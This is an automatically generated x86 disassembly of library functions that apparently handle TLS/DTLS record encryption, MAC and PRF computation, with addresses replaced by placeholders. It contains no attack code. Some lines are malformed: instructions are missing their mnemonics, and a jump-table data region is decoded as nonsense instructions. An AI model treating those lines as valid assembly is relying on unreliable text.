push rw-data
lea ecx [ esp + 0x5c ]
push ecx
call sub_1002ab80
mov edx [ esp + 0x7c ]
add esp 0x48
lea eax [ esp + 0x18 ]
push edx
push edi
push eax
call sub_1002ab80
lea ecx [ esp + 0x40 ]
lea edx [ esp + 0x24 ]
push ecx
push edi
push edx
call sub_1002aba0
lea eax [ esp + 0x30 ]
push eax
call sub_1002b000
add esp 0x1c
mov eax 0x7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4 ]
mov dl [ eax + ecx ]
inc dl
mov [ eax + ecx ] dl
jne r-xdata
sub_1001a9d0
mov eax 0x58
call sub_1001d0d0
push ebx
push ebp
push esi
lea eax [ esp + 0x14 ]
push edi
push eax
mov [ esp + 0x18 ] 0x0
call sub_1002aa30
mov esi [ esp + 0x70 ]
mov ebp [ esp + 0x74 ]
add esp 0x4
mov ebx rw-data
mov ecx [ esi + 0xd8 ]
push 0x0
lea eax [ esp + 0x1c ]
mov edx [ ecx + 0x90 ]
push edx
push eax
call sub_1002aa50
mov edx [ ebx ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x28 ]
push edx
push ecx
call sub_1002ab80
mov edi [ esp + 0x90 ]
mov edx [ esp + 0x8c ]
push edi
lea eax [ esp + 0x34 ]
push edx
push eax
call sub_1002ab80
mov ecx [ esi + 0x58 ]
push 0x20
add ecx 0xb8
lea edx [ esp + 0x40 ]
push ecx
push edx
call sub_1002ab80
mov eax [ esi + 0x58 ]
push 0x20
add eax 0x98
lea ecx [ esp + 0x4c ]
push eax
push ecx
call sub_1002ab80
lea edx [ esp + 0x4c ]
lea eax [ esp + 0x64 ]
push edx
lea ecx [ esp + 0x58 ]
push eax
push ecx
call sub_1002aba0
mov edx [ esi + 0xd8 ]
add esp 0x48
lea ecx [ esp + 0x18 ]
mov eax [ edx + 0x8c ]
push 0x0
push eax
push ecx
call sub_1002aa50
mov edx [ esp + 0x80 ]
push edi
lea eax [ esp + 0x28 ]
push edx
push eax
call sub_1002ab80
mov ecx [ esp + 0x28 ]
lea edx [ esp + 0x40 ]
push ecx
lea eax [ esp + 0x34 ]
push edx
push eax
call sub_1002ab80
lea ecx [ esp + 0x34 ]
lea edx [ esp + 0x3c ]
push ecx
push ebp
push edx
call sub_1002aba0
mov eax [ esp + 0x40 ]
mov edx [ esp + 0x44 ]
add edx eax
add esp 0x30
add ebp eax
mov [ esp + 0x14 ] edx
add ebx 0x4
cmp ebx rw-data
jl r-xdata
lea eax [ esp + 0x18 ]
push eax
call sub_1002b000
mov eax [ esp + 0x18 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x58
retn
sub_1001ab20
mov eax [ esp + 0x4 ]
cmp eax 0x64
ja r-xdata
or eax 0xffffffff
retn
xor ecx ecx
mov cl [ eax + lookup_table_1001abbc ]
jmp [ ecx * 4 + jump_table_1001ab84 ]
xor eax eax
retn
mov eax 0xa
retn
mov eax 0x14
retn
mov eax 0x1e
retn
mov eax 0x28
retn
mov eax 0x29
retn
mov eax 0x2a
retn
mov eax 0x2b
retn
mov eax 0x2c
retn
mov eax 0x2d
retn
mov eax 0x2e
retn
mov eax 0x2f
retn
sub_1001abca
or eax 0xd0d0d0d
or eax 0xd020202
or eax 0xd0d0d0d
or eax 0xd0d0d03
or eax 0xd0d0d0d
or eax 0x7060504
or [ ecx ] cl
or cl [ ebx ]
push es
add al 0x4
add al 0xd
or eax 0xd0d0d0d
or eax 0xd0d040d
or eax 0xd0d0d0d
or eax 0xd04040d
or eax 0xd0d0d0d
or eax 0xd0d040d
or eax 0xd0d0d0d
or eax 0xd0d040d
or eax 0xd0d0d0d
or eax 0x90900c0d
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov eax 0xf8
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x100 ]
push ebp
push esi
mov eax [ ebx + 0x58 ]
push edi
xor ebp ebp
mov ecx [ eax + 0x348 ]
mov edx [ eax + 0x37c ]
mov edi [ eax + 0x380 ]
mov esi [ eax + 0x384 ]
mov ecx [ ecx + 0x10 ]
mov al [ esp + 0x110 ]
and ecx 0x2
mov [ esp + 0x10 ] ebp
test al 0x1
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] edx
je r-xdata
cmp [ ebx + 0x88 ] ebp
je r-xdata
cmp [ ebx + 0x7c ] ebp
je r-xdata
push 0x138
push r--data
push 0x8c
call sub_1001d4c0
add esp 0xc
cmp eax ebp
mov [ ebx + 0x88 ] eax
jne r-xdata
mov [ esp + 0x10 ] 0x1
jmp r-xdata
push 0x113
push r--data
push 0x8c
call sub_1001d4c0
add esp 0xc
cmp eax ebp
mov [ ebx + 0x7c ] eax
je r-xdata
mov [ esp + 0x10 ] 0x1
jmp r-xdata
push eax
call sub_1001d7d0
add esp 0x4
push 0x1c1
push r--data
push 0x41
jmp r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ ebx + 0x88 ]
cmp eax ebp
mov [ esp + 0x24 ] edx
mov [ ebx + 0x8c ] edi
je r-xdata
push eax
call sub_1001d7d0
add esp 0x4
mov eax [ ebx + 0x7c ]
mov [ ebx + 0x80 ] edi
mov [ esp + 0x24 ] eax
mov eax [ ebx + 0x84 ]
cmp eax ebp
je r-xdata
cmp esi ebp
je r-xdata
push eax
call sub_1001d370
add esp 0x4
mov [ ebx + 0x90 ] ebp
push 0xd1
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0xf8
retn
cmp esi ebp
je r-xdata
push eax
call sub_1001d370
add esp 0x4
mov [ ebx + 0x84 ] ebp
cmp [ ebx ] 0xfeff
je r-xdata
mov eax [ esi + 0x8 ]
push eax
call sub_1001d320
add esp 0x4
cmp eax ebp
mov [ ebx + 0x90 ] eax
jne r-xdata
cmp [ ebx ] 0xfeff
je r-xdata
mov ecx [ esi + 0x8 ]
push ecx
call sub_1001d320
add esp 0x4
cmp eax ebp
mov [ ebx + 0x84 ] eax
jne r-xdata
mov eax [ ebx + 0x58 ]
add eax 0x58
mov edx [ ebx + 0x58 ]
xor ecx ecx
add edx 0x50
mov [ edx ] ecx
mov [ edx + 0x4 ] ecx
push 0x14a
push r--data
push 0x8e
jmp r-xdata
mov eax [ ebx + 0x58 ]
add eax 0x10
jmp r-xdata
mov ecx [ ebx + 0x58 ]
xor eax eax
add ecx 0x8
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov edx [ ebx + 0x58 ]
cmp [ edx + 0x114 ] ebp
jne r-xdata
push 0x125
push r--data
push 0x8e
jmp r-xdata
mov ecx [ ebx + 0x58 ]
push edi
mov esi [ ecx + 0x378 ]
call sub_1002b600
mov edx [ esp + 0x1c ]
mov edi eax
push edx
call sub_1002b600
mov ebp eax
mov eax [ esp + 0x1c ]
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x24 ]
push eax
call sub_1001db30
add esp 0x4
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x10 ]
cmp eax ebp
je r-xdata
mov edx [ ebx + 0x58 ]
cmp [ edx + 0x114 ] ebp
je r-xdata
push 0x12a
push r--data
push 0x4800
call sub_1001d4c0
mov ecx [ ebx + 0x58 ]
add esp 0xc
mov [ ecx + 0x114 ] eax
mov ecx [ esp + 0x18 ]
push ecx
call sub_1002b5d0
mov ecx [ esp + 0x114 ]
add esp 0x4
cmp ecx 0x12
mov [ esp + 0x2c ] eax
je r-xdata
mov eax [ ebx + 0x58 ]
mov edx [ eax + 0x348 ]
mov eax [ edx + 0x10 ]
and eax 0x8
je r-xdata
lea ecx [ edi + edi ]
mov [ esp + 0x30 ] esi
mov [ esp + 0x28 ] 0x1
lea edx [ ecx + esi ]
lea ecx [ ecx + ebp * 2 ]
mov [ esp + 0x10 ] edx
lea edx [ ecx + esi ]
lea ecx [ ecx + eax * 2 ]
mov [ esp + 0x1c ] edx
mov eax r--data
cmp ecx 0x21
je r-xdata
mov ecx [ edx + 0xc ]
and ecx 0x1c3f8000
sub ecx 0x8000
neg ecx
sbb ecx ecx
add ecx 0x8
mov ecx 0x5
jmp r-xdata
mov esi [ esp + 0x30 ]
mov ecx edi
mov edi [ esp + 0x20 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
push 0x178
push r--data
push 0x44
lea edx [ edi + esi ]
lea ecx [ ebp + edi * 2 ]
mov [ esp + 0x30 ] edx
mov [ esp + 0x28 ] 0x0
lea edx [ ecx + esi ]
mov [ esp + 0x10 ] edx
lea edx [ eax + ebp ]
add ecx edx
lea edx [ ecx + esi ]
add ecx eax
mov [ esp + 0x1c ] edx
mov eax r--data
jmp r-xdata
test eax eax
je r-xdata
cmp ebp ecx
jl r-xdata
mov eax [ esp + 0x110 ]
mov edx [ ebx + 0xbc ]
mov ecx [ esp + 0x10 ]
and eax 0x2
push eax
mov eax [ esp + 0x20 ]
mov [ edx + 0x4 ] 0x0
mov edx [ esp + 0x1c ]
push eax
mov eax [ esp + 0x2c ]
push ecx
push 0x0
push edx
push eax
call sub_1001d7e0
lea ecx [ esp + 0xc0 ]
push 0x20
push ecx
call sub_10026870
lea edx [ esp + 0x108 ]
push 0x20
push edx
call sub_10026870
lea eax [ esp + 0x5c ]
push 0x20
push eax
call sub_10026870
lea ecx [ esp + 0xf8 ]
push 0x20
push ecx
call sub_10026870
add esp 0x38
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0xf8
retn
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ esp + 0x54 ] ecx
mov ecx [ eax + 0x8 ]
mov [ esp + 0x58 ] edx
mov edx [ eax + 0xc ]
mov eax [ ebx + 0x58 ]
mov [ esp + 0x5c ] ecx
mov ecx 0x8
lea edi [ esp + 0x64 ]
lea esi [ eax + 0xb8 ]
mov [ esp + 0x60 ] edx
[ edi ] [ esi ]
lea esi [ eax + 0x98 ]
mov eax [ esp + 0x18 ]
mov ecx 0x8
lea edi [ esp + 0x84 ]
[ edi ] [ esi ]
push eax
call sub_1002b600
mov ecx [ ebx + 0xd8 ]
mov edi eax
mov eax ebp
push edi
mov edx [ ecx + 0x90 ]
and ebp 0x1
mov [ esp + 0x28 ] edx
cdq
sub eax edx
mov esi eax
mov eax [ esp + 0x18 ]
sar esi 0x1
lea edx [ esi + eax ]
add esi ebp
mov [ esp + 0x1c ] edx
lea edx [ esp + 0xb0 ]
push edx
mov edx 0x50
push edx
lea edx [ esp + 0x64 ]
push edx
push esi
push eax
mov eax [ ecx + 0x8c ]
push eax
call sub_1001b1d0
lea ecx [ esp + 0x108 ]
push edi
mov eax 0x50
push ecx
mov ecx [ esp + 0x48 ]
lea edx [ esp + 0x7c ]
push eax
mov eax [ esp + 0x40 ]
push edx
push esi
push eax
push ecx
call sub_1001b1d0
add esp 0x3c
xor eax eax
test edi edi
jle r-xdata
mov edx [ ebx + 0x58 ]
cmp ecx [ edx + 0x374 ]
jle r-xdata
mov ebp [ edx + 0xc ]
and ebp 0x1c3f8000
sub ebp 0x8000
neg ebp
sbb ebp ebp
add ebp 0x8
mov ebp 0x5
jmp r-xdata
mov edx [ esp + 0x2c ]
lea eax [ esp + 0xa8 ]
test edx edx
mov [ esp + 0x10 ] eax
jle r-xdata
mov dl [ esp + eax + 0xe8 ]
mov cl [ esp + eax + 0xa8 ]
xor cl dl
mov [ esp + eax + 0xa8 ] cl
inc eax
cmp eax edi
jl r-xdata
mov eax [ r--data ]
mov ecx [ r--data ]
mov [ esp + 0x58 ] eax
mov eax [ ebx + 0x58 ]
mov [ esp + 0x54 ] ecx
mov ecx 0x8
lea esi [ eax + 0xb8 ]
lea edi [ esp + 0x5c ]
[ edi ] [ esi ]
lea esi [ eax + 0x98 ]
mov eax [ ebx + 0xd8 ]
mov ecx 0x8
lea edi [ esp + 0x7c ]
[ edi ] [ esi ]
mov ebp [ eax + 0x90 ]
mov eax [ eax + 0x8c ]
lea esi [ edx + edx ]
lea ecx [ esp + 0x34 ]
mov edi 0x48
push esi
push ecx
lea edx [ esp + 0x5c ]
push edi
push edx
push 0x0
push r--data
push eax
call sub_1001b1d0
lea ecx [ esp + 0xe4 ]
push esi
push ecx
lea edx [ esp + 0x78 ]
push edi
push edx
push 0x0
push r--data
push ebp
call sub_1001b1d0
add esp 0x38
xor eax eax
test esi esi
jle r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov cl [ esp + eax + 0xc8 ]
mov dl [ esp + eax + 0x34 ]
xor dl cl
mov [ esp + eax + 0x34 ] dl
inc eax
cmp eax esi
jl r-xdata
mov eax [ esp + 0x2c ]
lea ecx [ esp + eax + 0x34 ]
mov [ esp + 0x1c ] ecx
lea edx [ esp + 0x34 ]
mov [ esp + 0x1c ] edx
jmp r-xdata
sub_1001b1d0
mov eax 0x1b8
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x1c8 ]
push edi
push esi
call sub_1002b600
mov ebx eax
lea eax [ esp + 0x5c ]
push eax
call sub_1002bd20
lea ecx [ esp + 0x118 ]
push ecx
call sub_1002bd20
lea edx [ esp + 0x64 ]
push 0x8
push edx
call sub_1002bd80
lea eax [ esp + 0x124 ]
push 0x8
push eax
call sub_1002bd80
mov edi [ esp + 0x1f0 ]
mov ebp [ esp + 0x1ec ]
push 0x0
push esi
push edi
lea ecx [ esp + 0x80 ]
push ebp
push ecx
call sub_1002bae0
push 0x0
push esi
push edi
lea edx [ esp + 0x14c ]
push ebp
push edx
call sub_1002bae0
mov ebp [ esp + 0x220 ]
mov edi [ esp + 0x21c ]
add esp 0x44
lea eax [ esp + 0x58 ]
push ebp
push edi
push eax
call sub_1002bca0
lea ecx [ esp + 0x1c ]
lea edx [ esp + 0x24 ]
push ecx
lea eax [ esp + 0x68 ]
push edx
push eax
call sub_1002bcc0
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x7c ]
push 0x0
push ecx
call sub_1002bae0
push 0x0
push 0x0
push 0x0
lea edx [ esp + 0x148 ]
push 0x0
push edx
call sub_1002bae0
mov eax [ esp + 0x50 ]
add esp 0x40
lea ecx [ esp + 0x18 ]
lea edx [ esp + 0x58 ]
push eax
push ecx
push edx
call sub_1002bca0
mov eax [ esp + 0x1c ]
lea ecx [ esp + 0x24 ]
push eax
push ecx
lea edx [ esp + 0x124 ]
push edx
call sub_1002bca0
push ebp
lea eax [ esp + 0x74 ]
push edi
push eax
call sub_1002bca0
mov esi [ esp + 0x208 ]
add esp 0x24
cmp esi ebx
jle r-xdata
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x18 ]
push ecx
lea eax [ esp + 0x5c ]
push edx
push eax
call sub_1002bcc0
mov edi [ esp + 0x1ec ]
mov ecx esi
mov edx ecx
lea esi [ esp + 0x24 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x64 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_1002bd50
lea ecx [ esp + 0x120 ]
push ecx
call sub_1002bd50
lea edx [ esp + 0x2c ]
push 0x40
push edx
call sub_10026870
add esp 0x1c
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1b8
retn
mov edx [ esp + 0x1e0 ]
lea ecx [ esp + 0x14 ]
push ecx
lea eax [ esp + 0x5c ]
push edx
push eax
call sub_1002bcc0
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x1ec ]
add edx eax
lea ecx [ esp + 0x1c ]
mov [ esp + 0x1ec ] edx
sub esi eax
lea edx [ esp + 0x24 ]
push ecx
lea eax [ esp + 0x120 ]
push edx
push eax
call sub_1002bcc0
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x7c ]
push 0x0
push ecx
call sub_1002bae0
push 0x0
push 0x0
push 0x0
lea edx [ esp + 0x148 ]
push 0x0
push edx
call sub_1002bae0
mov eax [ esp + 0x50 ]
add esp 0x40
lea ecx [ esp + 0x18 ]
lea edx [ esp + 0x58 ]
push eax
push ecx
push edx
call sub_1002bca0
mov eax [ esp + 0x1c ]
lea ecx [ esp + 0x24 ]
push eax
lea edx [ esp + 0x120 ]
push ecx
push edx
call sub_1002bca0
push ebp
lea eax [ esp + 0x74 ]
push edi
push eax
call sub_1002bca0
add esp 0x24
cmp esi ebx
jg r-xdata
sub_1001b410
mov eax 0x6c
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x74 ]
push ebp
push esi
mov eax [ ebx + 0x58 ]
mov ecx [ eax + 0x374 ]
test ecx ecx
jne r-xdata
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x6c
retn
lea ecx [ esp + 0x20 ]
lea edx [ esp + 0xc ]
push ecx
mov ecx [ ebx + 0xbc ]
lea eax [ esp + 0x80 ]
push edx
push eax
push ecx
call sub_1000fce0
add esp 0x10
test eax eax
jne r-xdata
mov edx [ ebx + 0x58 ]
mov eax [ esp + 0x7c ]
mov [ edx + 0x37c ] eax
mov ecx [ ebx + 0x58 ]
mov edx [ esp + 0xc ]
mov [ ecx + 0x380 ] edx
mov eax [ esp + 0x7c ]
push eax
call sub_1002b5d0
mov ecx [ esp + 0x80 ]
mov ebp eax
push ecx
call sub_1002b600
mov edx [ esp + 0x14 ]
add ebp eax
push edx
call sub_1002b600
add ebp eax
push ebx
shl ebp 0x1
call sub_1001a420
push 0x1e3
push r--data
push ebp
call sub_1001d4c0
mov esi eax
add esp 0x1c
test esi esi
mov [ esp + 0x10 ] esi
je r-xdata
push 0x1d7
push r--data
push 0x8a
jmp r-xdata
push 0x211
push r--data
push 0x41
push 0x1e5
push r--data
push ebp
call sub_1001d4c0
add esp 0xc
mov [ esp + 0x14 ] eax
test eax eax
jne r-xdata
push 0xd3
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
pop ebp
pop ebx
add esp 0x6c
retn
mov eax [ ebx + 0x58 ]
push edi
lea edi [ esp + 0x35 ]
push ebp
mov [ eax + 0x374 ] ebp
mov ecx [ ebx + 0x58 ]
mov [ ecx + 0x378 ] esi
mov eax [ r--data ]
mov edx [ r--data ]
mov ecx [ r--data ]
mov [ esp + 0x30 ] eax
mov eax [ ebx + 0x58 ]
mov [ esp + 0x2c ] edx
mov dl [ r--data ]
mov [ esp + 0x34 ] ecx
lea esi [ eax + 0x98 ]
mov ecx 0x8
mov [ esp + 0x38 ] dl
[ edi ] [ esi ]
lea esi [ eax + 0xb8 ]
mov eax [ ebx + 0xbc ]
mov ecx 0x8
lea edi [ esp + 0x59 ]
[ edi ] [ esi ]
mov ecx [ eax + 0x10 ]
lea edi [ eax + 0x14 ]
mov eax [ ebx + 0xd8 ]
mov eax [ eax + 0x90 ]
mov [ esp + 0x24 ] eax
mov eax ecx
cdq
sub eax edx
and ecx 0x1
mov esi eax
mov eax [ esp + 0x18 ]
sar esi 0x1
push eax
mov eax 0x4d
lea edx [ esi + edi ]
add esi ecx
push eax
mov eax [ ebx + 0xd8 ]
lea ecx [ esp + 0x34 ]
mov [ esp + 0x28 ] edx
mov edx [ eax + 0x8c ]
push ecx
push esi
push edi
push edx
call sub_1001b1d0
mov edi [ esp + 0x34 ]
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x3c ]
push ebp
mov eax 0x4d
push edi
push eax
lea eax [ esp + 0x50 ]
push eax
push esi
push ecx
push edx
call sub_1001b1d0
add esp 0x38
test ebp ebp
jle r-xdata
push ebp
push edi
call sub_10026870
push edi
call sub_1001d740
mov eax [ ebx + 0xf4 ]
add esp 0xc
test ah 0x8
pop edi
jne r-xdata
mov eax [ esp + 0x14 ]
mov esi edi
sub esi eax
mov ecx ebp
mov eax [ ebx + 0x58 ]
mov [ eax + 0xd8 ] 0x1
mov ecx [ ebx + 0xbc ]
mov eax [ ecx + 0xac ]
xor ecx ecx
cmp eax ecx
je r-xdata
mov dl [ esi + eax ]
xor [ eax ] dl
inc eax
dec ecx
jne r-xdata
mov edx [ eax + 0xc ]
and edx 0x1c3f8000
cmp edx 0x200000
jne r-xdata
mov edx [ ebx + 0xbc ]
mov eax [ edx + 0xac ]
mov edx [ eax + 0xc ]
and edx 0x1c3f8000
cmp edx 0x20000
jne r-xdata
mov eax [ ebx + 0x58 ]
mov [ eax + 0xd8 ] ecx
mov eax [ ebx + 0x58 ]
mov [ eax + 0xd8 ] ecx
sub_1001b690
mov eax 0x4
call sub_1001d0d0
mov eax [ esp + 0xc ]
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
test eax eax
je r-xdata
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
mov eax [ esi + 0x8c ]
test eax eax
je r-xdata
mov ebx [ esi + 0x58 ]
mov eax [ esi + 0x7c ]
add ebx 0x100
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
push eax
call sub_1002b600
add esp 0x4
mov ebx [ esi + 0x58 ]
mov edi [ esi + 0x88 ]
add ebx 0x128
mov [ esp + 0x10 ] edi
test edi edi
jne r-xdata
push eax
call sub_1002b600
add esp 0x4
mov edi [ esp + 0x10 ]
mov esi [ esp + 0x18 ]
push eax
call sub_1002c960
add esp 0x4
push edi
call sub_1002c960
add esp 0x4
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0xc ]
push eax
push ecx
push edx
call memmove
mov eax [ ebx + 0xc ]
add esp 0xc
mov [ ebx + 0x10 ] eax
test edi edi
je r-xdata
mov ecx [ esi + 0xbc ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
mov ebp [ ebx + 0x4 ]
push eax
call sub_1002cb10
mov esi eax
add esp 0x4
cmp esi 0x1
je r-xdata
mov eax [ esp + 0x1c ]
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0xc ]
push ebp
push ecx
push edx
push edi
call sub_1001dba0
add esp 0x10
cmp esi 0x1
je r-xdata
test ebp ebp
je r-xdata
mov eax ebp
cdq
idiv esi
mov eax esi
sub eax edx
mov edx [ esp + 0x18 ]
mov edi [ edx + 0xf4 ]
lea ecx [ eax - 0x1 ]
test edi 0x200
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn
mov eax [ esp + 0x1c ]
test eax eax
jne r-xdata
push 0x26d
push r--data
push 0x81
push 0xd2
push 0x14
call sub_1001de60
mov eax [ esp + 0x2c ]
push 0x15
push 0x2
push eax
call sub_10013ab0
add esp 0x20
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax ebp
xor edx edx
div esi
test edx edx
je r-xdata
lea edi [ eax + ebp ]
cmp ebp edi
jge r-xdata
mov edx [ edx + 0x58 ]
test [ edx ] 0x8
je r-xdata
mov eax [ ebx + 0xc ]
xor ecx ecx
mov cl [ eax + ebp - 0x1 ]
mov eax ecx
mov ecx [ esp + 0x18 ]
mov [ esp + 0x1c ] eax
inc eax
mov edx [ ecx + 0xf4 ]
test dh 0x2
je r-xdata
mov ecx [ ebx + 0x4 ]
mov ebp edi
mov edi [ esp + 0x10 ]
add ecx eax
mov [ ebx + 0x4 ] ecx
mov edx [ ebx + 0x10 ]
inc ebp
cmp ebp edi
mov [ edx + ebp - 0x1 ] cl
jl r-xdata
inc ecx
mov edi [ ebx + 0x4 ]
cmp eax edi
jle r-xdata
mov edx [ ecx + 0x84 ]
test edx edx
jne r-xdata
mov esi ebp
sub esi eax
cmp esi ebp
jge r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
pop ecx
retn
mov edx [ ecx + 0x58 ]
mov ecx 0x2
mov [ esp + 0x10 ] edx
mov edi r--data
lea esi [ edx + 0x8 ]
xor edx edx
[ esi ] [ edi ]
jne r-xdata
sub edi eax
mov eax 0x1
mov [ ebx + 0x4 ] edi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov ecx [ ebx + 0xc ]
xor edx edx
mov dl [ ecx + esi ]
mov ecx [ esp + 0x1c ]
cmp edx ecx
jne r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ ecx + 0x58 ]
test [ edx ] 0x8
je r-xdata
test [ esp + 0x1c ] 0x1
jne r-xdata
inc esi
cmp esi ebp
jl r-xdata
dec eax
mov ecx [ esp + 0x10 ]
or [ ecx ] 0x8
sub_1001b8d0
mov eax 0x14
call sub_1001d0d0
lea eax [ esp + 0x4 ]
push eax
call sub_1002aa30
mov ecx [ esp + 0x20 ]
lea edx [ esp + 0x8 ]
push ecx
push edx
call sub_1002ac20
mov ecx [ esp + 0x2c ]
lea eax [ esp + 0xc ]
push eax
lea edx [ esp + 0x14 ]
push ecx
push edx
call sub_1002aba0
lea eax [ esp + 0x1c ]
push eax
call sub_1002b000
mov eax [ esp + 0x1c ]
add esp 0x30
retn
sub_1001b920
mov eax 0x54
call sub_1001d0d0
mov eax [ esp + 0x68 ]
push ebx
mov ecx eax
push ebp
push esi
mov esi [ esp + 0x70 ]
mov edx ecx
push edi
lea edi [ esp + 0x2c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea esi [ esp + eax + 0x2c ]
lea eax [ esp + 0x1c ]
push eax
call sub_1002aa30
mov ecx [ esp + 0x70 ]
lea edx [ esp + 0x20 ]
push ecx
push edx
call sub_1002ac20
lea eax [ esp + 0x84 ]
lea ecx [ esp + 0x28 ]
push eax
push esi
push ecx
call sub_1002aba0
mov edx [ esp + 0x88 ]
mov ecx [ esp + 0x90 ]
lea eax [ esp + 0x34 ]
push edx
push eax
add esi ecx
call sub_1002ac20
lea ecx [ esp + 0x98 ]
lea edx [ esp + 0x3c ]
push ecx
push esi
push edx
call sub_1002aba0
mov edx [ esp + 0x94 ]
mov edi [ esp + 0xa4 ]
push 0xc
mov eax [ edx + 0xbc ]
mov ebp [ edx + 0xd8 ]
mov ecx [ eax + 0x10 ]
mov edx [ ebp + 0x90 ]
lea ebx [ eax + 0x14 ]
lea eax [ esp + 0x5c ]
sub edi eax
mov eax ecx
mov [ esp + 0x9c ] edx
add edi esi
cdq
sub eax edx
and ecx 0x1
mov esi eax
lea edx [ esp + 0x5c ]
sar esi 0x1
lea eax [ esi + ebx ]
add esi ecx
mov ecx [ esp + 0xac ]
mov [ esp + 0xa4 ] eax
mov eax [ ebp + 0x8c ]
push ecx
push edi
push edx
push esi
push ebx
push eax
call sub_1001b1d0
add esp 0x48
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x2c ]
push 0xc
push ecx
push edi
mov eax [ esp + 0x80 ]
mov ecx [ esp + 0x78 ]
push edx
push esi
push eax
push ecx
call sub_1001b1d0
mov eax [ esp + 0x98 ]
lea ecx [ esp + 0x2c ]
add esp 0x1c
sub ecx eax
mov esi 0xc
mov dl [ ecx + eax ]
mov bl [ eax ]
xor bl dl
mov [ eax ] bl
inc eax
dec esi
jne r-xdata
lea eax [ esp + 0x1c ]
push eax
call sub_1002b000
add esp 0x4
mov eax 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x54
retn
sub_1001ba80
mov eax 0xd0
call sub_1001d0d0
mov eax [ esp + 0xdc ]
push ebx
push ebp
push esi
mov esi [ esp + 0xe0 ]
push edi
test eax eax
mov eax [ esi + 0x58 ]
je r-xdata
mov edi [ esi + 0x80 ]
lea ebx [ eax + 0x100 ]
lea ebp [ eax + 0x10 ]
add eax 0x8
mov [ esp + 0x18 ] eax
mov edi [ esi + 0x8c ]
lea ebx [ eax + 0x128 ]
lea ebp [ eax + 0x58 ]
add eax 0x50
mov [ esp + 0x18 ] eax
jmp r-xdata
mov cl [ esi ]
sar eax 0x8
mov [ esp + 0x11 ] al
mov [ esp + 0x12 ] cl
cmp [ esi + 0x104 ] 0x100
jne r-xdata
push edi
call sub_1002b600
mov [ esp + 0x20 ] eax
mov al [ ebx ]
mov [ esp + 0x14 ] al
mov eax [ esi ]
add esp 0x4
cmp eax 0xfeff
jne r-xdata
mov edx [ esp + 0x18 ]
push 0x8
lea eax [ esp + 0x2c ]
push edx
push eax
call sub_1002bca0
mov edi [ esp + 0x24 ]
add esp 0xc
cmp [ esi + 0x104 ] 0x100
je r-xdata
mov [ esp + 0x11 ] 0x3
mov [ esp + 0x12 ] 0x1
jmp r-xdata
mov eax [ esp + 0x1c ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0xd0
retn
mov eax 0x7
mov edi [ esp + 0xec ]
mov ecx [ esi + 0x5c ]
test edi edi
je r-xdata
mov edx [ ebx + 0x4 ]
lea ecx [ esp + 0x28 ]
shr edx 0x8
mov [ esp + 0x13 ] dl
mov al [ ebx + 0x4 ]
push ecx
mov [ esp + 0x18 ] al
call sub_1002bd20
add esp 0x4
push 0x0
push edi
push edi
call sub_1002b600
add esp 0x4
lea edx [ esp + 0x30 ]
push eax
push ebp
push edx
call sub_1002bae0
mov eax [ esi ]
add esp 0x14
cmp eax 0xfeff
jne r-xdata
dec eax
jns r-xdata
xor eax eax
mov ax [ ecx + 0x48 ]
xor eax eax
mov ax [ ecx + 0x4a ]
jmp r-xdata
mov cl [ eax + edi ]
inc cl
mov [ eax + edi ] cl
jne r-xdata
xor eax eax
mov ax [ ecx + 0x48 ]
xor eax eax
mov ax [ ecx + 0x4a ]
jmp r-xdata
sar eax 0x8
test edi edi
mov [ esp + 0x20 ] al
je r-xdata
lea ecx [ esp + 0x10 ]
push 0x5
lea edx [ esp + 0x2c ]
push ecx
push edx
call sub_1002bca0
mov eax [ ebx + 0x4 ]
mov ecx [ ebx + 0x10 ]
push eax
